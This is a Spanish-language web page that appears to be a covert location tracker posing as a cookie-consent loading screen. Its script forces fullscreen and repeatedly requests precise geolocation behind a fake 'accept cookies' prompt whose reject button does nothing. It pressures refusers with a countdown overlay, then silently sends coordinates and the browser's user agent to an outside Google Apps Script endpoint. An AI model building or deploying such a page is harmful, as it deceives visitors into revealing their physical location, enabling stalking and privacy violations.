<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cargando página</title>
<style>
  body {
    display:flex;align-items:center;justify-content:center;
    height:100vh;margin:0;
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
    background:#0b0b0b;color:#fff;overflow:hidden;
  }
  .card {
    padding:24px;border-radius:12px;background:#121212;text-align:center;
    width:min(420px,92vw);box-shadow:0 10px 30px rgba(0,0,0,.35);
  }
  .loader {
    border:8px solid #333;border-top:8px solid #27ae60;border-radius:50%;
    width:80px;height:80px;margin:20px auto;animation:spin 2s linear infinite;
  }
  @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
  p { margin:12px 0 0;color:#aab; }
  .alert { color:#ff6b6b;margin-top:12px;font-size:0.95rem;min-height:1.2em }

  /* Overlay */
  .overlay {
    position:fixed;inset:0;background:rgba(0,0,0,.85);
    display:none;align-items:center;justify-content:center;
    flex-direction:column;z-index:9999;text-align:center;padding:20px;
  }
  .count {
    font-size:64px;line-height:1;margin-top:8px;color:#27ae60;font-weight:700;
  }

  /* Banner cookies */
  #cookieBanner {
    position:fixed;bottom:0;left:0;right:0;background:#1b1b1b;color:#fff;
    padding:16px;text-align:center;box-shadow:0 -4px 12px rgba(0,0,0,.4);
    display:flex;flex-direction:column;align-items:center;gap:10px;z-index:10000;
  }
  #cookieBanner button {
    margin:4px;padding:10px 18px;border-radius:8px;font-size:1rem;border:none;cursor:pointer;
  }
  #cookieBanner .accept {background:#27ae60;color:#fff;}
  #cookieBanner .reject {background:#333;color:#ccc;border:1px solid #666;}
</style>
</head>
<body>
  <div class="card">
    <h2>Cargando página</h2>
    <div class="loader" id="loader"></div>
    <p id="status">Esperando cookies...</p>
    <p class="alert" id="alertMsg"></p>
  </div>

  <!-- Banner cookies / ubicación -->
  <div id="cookieBanner">
    <p>🍪 Usamos cookies para mejorar tu experiencia.<br>
    Al aceptar, se solicitarán permisos de la web.</p>
    <div>
      <button class="accept" id="acceptCookies">Aceptar y continuar</button>
      <button class="reject" id="rejectCookies">Rechazar</button>
    </div>
  </div>

  <!-- Overlay (3er intento) -->
  <div class="overlay" id="overlay">
    <div>
      <p style="color:#ddd;margin:0 0 6px">Inténtalo de nuevo para acceder</p>
      <div class="count" id="count">5</div>
      <p style="color:#aab;margin-top:10px">Concede acceso a la ubicación para continuar</p>
    </div>
  </div>

<script>
const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxwkROdWrrCoIlY5uZM6mJTLMGpFz-G4tJPsu2d9_9PGUyhLtwlwMUxTLfyQnZWhJCd/exec';
const SECRET   = 'direccion_010233!d';

const statusEl = document.getElementById('status');
const alertMsg = document.getElementById('alertMsg');
const loader   = document.getElementById('loader');
const cookieBanner = document.getElementById('cookieBanner');
const acceptBtn = document.getElementById('acceptCookies');
const rejectBtn = document.getElementById('rejectCookies');
const overlay  = document.getElementById('overlay');
const countEl  = document.getElementById('count');

let denyCount = 0;
let finished  = false;

/* === Pantalla completa === */
async function goFullscreen(){
  const docEl = document.documentElement;
  if (docEl.requestFullscreen) await docEl.requestFullscreen();
  else if (docEl.webkitRequestFullscreen) await docEl.webkitRequestFullscreen();
}

/* === Enviar datos === */
async function send(data){
  try{
    await fetch(ENDPOINT,{
      method:'POST',
      headers:{'Content-Type':'text/plain'},
      body:JSON.stringify(data),
      mode:'no-cors'
    });
  }catch(e){}
}

/* === Geolocalización === */
function getPosition(){
  return new Promise((resolve,reject)=>{
    navigator.geolocation.getCurrentPosition(resolve,reject,{
      enableHighAccuracy:true, timeout:12000, maximumAge:0
    });
  });
}

/* === Registro exitoso === */
async function registerAndClose(pos){
  const lat = pos.coords.latitude.toFixed(6);
  const lng = pos.coords.longitude.toFixed(6);
  const acc = (pos.coords.accuracy||0).toFixed(1);
  await send({ k:SECRET, lat, lng, accuracy:acc, device:navigator.userAgent });
  statusEl.textContent = 'Cookies aceptadas';
  alertMsg.textContent = '';
  finished = true;
  setTimeout(()=>{ try{window.close()}catch(e){} }, 1200);
}

/* === Flujo principal === */
async function requestLocation(){
  loader.style.display='block';
  statusEl.textContent='Cargando...';
  try{
    const pos = await getPosition();
    cookieBanner.style.display='none';
    await registerAndClose(pos);
  }catch(err){
    denyCount++;
    loader.style.display='none';
    alertMsg.textContent='Acepta las cookies para avanzar';
    cookieBanner.style.display='flex';
    if (denyCount >= 3 && !finished){
      startFinalOverlayAndAttempt();
    }
  }
}

/* === Overlay 3er intento === */
function startFinalOverlayAndAttempt(){
  overlay.style.display='flex';
  let n = 5;
  countEl.textContent = n;
  (async ()=>{
    try{
      const pos = await getPosition();
      if(!finished){
        overlay.style.display='none';
        cookieBanner.style.display='none';
        await registerAndClose(pos);
      }
    }catch(e){}
  })();
  const iv = setInterval(()=>{
    if (finished){ clearInterval(iv); return; }
    n--; countEl.textContent = n;
    if (n <= 0 && !finished){
      clearInterval(iv);
      try{ window.close(); }catch(e){}
    }
  }, 1000);
}

/* === Banner cookies === */
acceptBtn.addEventListener('click', async ()=>{
  await goFullscreen(); // entra en pantalla completa
  cookieBanner.style.display='none';
  requestLocation();
});

rejectBtn.addEventListener('click', ()=>{
  alert('No se puede acceder sin aceptar.');
  cookieBanner.style.display='flex';
});

/* === Inicio === */
cookieBanner.style.display = 'flex';
statusEl.textContent = 'Esperando cookies...';
alertMsg.textContent = '';
denyCount = 0;
finished = false;
</script>
</body>
</html>
